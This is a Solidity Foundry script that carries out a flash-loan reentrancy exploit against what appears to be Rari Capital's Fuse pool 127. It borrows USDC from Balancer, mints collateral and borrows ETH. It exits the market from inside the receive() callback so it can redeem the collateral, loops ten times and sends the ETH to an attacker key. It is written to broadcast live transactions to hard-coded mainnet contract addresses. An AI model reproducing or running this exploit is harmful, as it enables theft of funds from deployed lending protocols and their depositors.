// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "./interface.sol";
import "forge-std/Script.sol";

contract Rw3 is Script {
    uint256 immutable secret = vm.envUint("PRIVATE_KEY");
    address immutable attacker = vm.rememberKey(secret);

    function run() public {
        vm.startBroadcast(secret);

        Exploit ex = new Exploit();

        uint256 bal = attacker.balance;
        for (uint256 i = 0; i < 10; i++) {
            ex.run();
        }
        ex.withdraw();
        console.log(int256(attacker.balance) - int256(bal));

        vm.stopBroadcast();
    }
}

contract Exploit {
    // IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    // ComptrollerInterface unitroller =
    // ComptrollerInterface(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    // CErc20Interface fDAI = CErc20Interface(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
    // CErc20Interface fETH = CErc20Interface(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);

    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICEtherDelegate fETH_127 = ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
    ICErc20Delegate fusdc_127 = ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    IUnitroller rari_Comptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 bal = 150_000_000;
    uint256 bal_2 = 1977 * 1e18;

    function run() public {
        emit log_named_uint("ETH Balance of fETH_127 before borrowing", address(fETH_127).balance / 1e18);

        address[] memory tokens = new address[](1);
        tokens[0] = address(usdc);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = bal * 10 ** 6;

        usdc.approve(address(vault), type(uint256).max);
        vault.flashLoan(address(this), tokens, amounts, "");
    }

    function withdraw() public {
        console.log("ETH Balance of me before withdraw", address(this).balance / 1e18);
        (bool res,) = msg.sender.call{value: address(this).balance}("");
        require(res, "Transfer failed");
    }

    event log_named_uint(string name, uint256 value);

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        uint256 usdc_balance = usdc.balanceOf(address(this));
        emit log_named_uint("Borrow USDC from balancer", usdc_balance);

        usdc.approve(address(fusdc_127), type(uint256).max);
        fusdc_127.accrueInterest();
        fusdc_127.mint(bal * 10 ** 6);

        emit log_named_uint("fETH Balance after minting", fETH_127.balanceOf(address(this)));
        emit log_named_uint("USDC balance after minting", usdc.balanceOf(address(this)));

        address[] memory ctokens = new address[](1);
        ctokens[0] = address(fusdc_127);
        rari_Comptroller.enterMarkets(ctokens);
        fETH_127.borrow(bal_2);

        emit log_named_uint("ETH Balance of fETH_127_Pool after borrowing", address(fETH_127).balance / 1e18);
        emit log_named_uint("ETH Balance of me after borrowing", address(this).balance / 1e18);

        fusdc_127.approve(address(fusdc_127), type(uint256).max);
        fusdc_127.redeemUnderlying(bal * 10 ** 6);

        emit log_named_uint("USDC balance after borrowing", usdc.balanceOf(address(this)));
        usdc.transfer(address(vault), usdc.balanceOf(address(this)));
        emit log_named_uint("USDC balance after repaying", usdc.balanceOf(address(this)));
    }

    receive() external payable {
        rari_Comptroller.exitMarket(address(fusdc_127));
    }
}
